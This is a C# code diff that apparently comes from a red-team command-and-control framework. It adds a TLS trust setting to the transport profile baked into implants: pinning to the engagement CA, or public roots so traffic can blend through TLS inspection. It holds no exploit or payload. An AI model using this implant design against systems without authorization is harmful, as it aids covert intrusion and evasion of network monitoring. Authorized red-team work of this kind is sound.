@@ -31,6 +31,33 @@ public enum TransportEnvelope
 }
 
 /// <summary>
+/// Which roots the artifact's TLS dials trust (architecture.md Sec 9). The
+/// two postures are deliberately explicit: <see cref="Pinned"/> is the
+/// self-sufficient default, <see cref="Public"/> the real-domain front.
+/// Tasking trust is independent of this axis -- the CA cert rides the bake
+/// either way, as the tasking signer.
+/// </summary>
+public enum TlsTrust
+{
+    /// <summary>
+    /// The baked engagement CA is the only root: no public-PKI dependence,
+    /// no dependence on the target's stores, and no public CA can mint an
+    /// identity the artifact would accept. The default and the posture
+    /// every in-tree front serves.
+    /// </summary>
+    Pinned = 0,
+
+    /// <summary>
+    /// The front presents a publicly-trusted chain (a real domain with, say,
+    /// a Let's Encrypt certificate terminated at an operator-run edge in
+    /// front of the teamserver); the artifact validates like an ordinary
+    /// client, against the compiled-in Mozilla root set -- the posture for
+    /// blends that must survive TLS inspection. The dial must be https.
+    /// </summary>
+    Public = 1,
+}
+
+/// <summary>
 /// The malleable transport profile baked into an implant at generation
 /// (architecture.md Sec 7, Sec 8): the C2 endpoint the implant dials plus the
 /// URI, header, timing, and payload shape it speaks over the wire. Per-implant so
@@ -119,9 +146,20 @@ public sealed record TransportProfile(
     /// validates the server it dials against the C2's own CA rather than
     /// system roots -- the single-port https shape needs exactly this trust
     /// anchor, and every other shape gets server pinning for free. Null keeps
-    /// the artifact on system/default validation.
+    /// the artifact on system/default validation. The CA rides the bake in
+    /// every <see cref="TlsTrust"/> posture: it is the tasking signer, and
+    /// under <see cref="TlsTrust.Pinned"/> it is also the TLS root.
     /// </summary>
     public string? CaPem { get; init; }
+
+    /// <summary>
+    /// Which roots the artifact's TLS dials trust (architecture.md Sec 9).
+    /// <see cref="TlsTrust.Pinned"/> -- the default -- validates against the
+    /// baked CA alone; <see cref="TlsTrust.Public"/> validates the front's
+    /// publicly-trusted chain against the compiled-in Mozilla root set, for
+    /// a real-domain front terminated at an operator-run edge.
+    /// </summary>
+    public TlsTrust TlsTrust { get; init; } = Defaults.TlsTrust;
 
     /// <summary>
     /// The shared default values for the malleable knobs. Centralized so the
@@ -137,6 +175,7 @@ public sealed record TransportProfile(
         public static readonly TimeSpan RequestTimeout = TimeSpan.FromSeconds(30);
         public const TransportEnvelope Envelope = TransportEnvelope.AesGcm;
         public const bool ContactProtection = true;
+        public const TlsTrust TlsTrust = PayloadBuild.TlsTrust.Pinned;
         public static readonly IReadOnlyList<string> FallbackEndpoints = Array.Empty<string>();
     }
 }
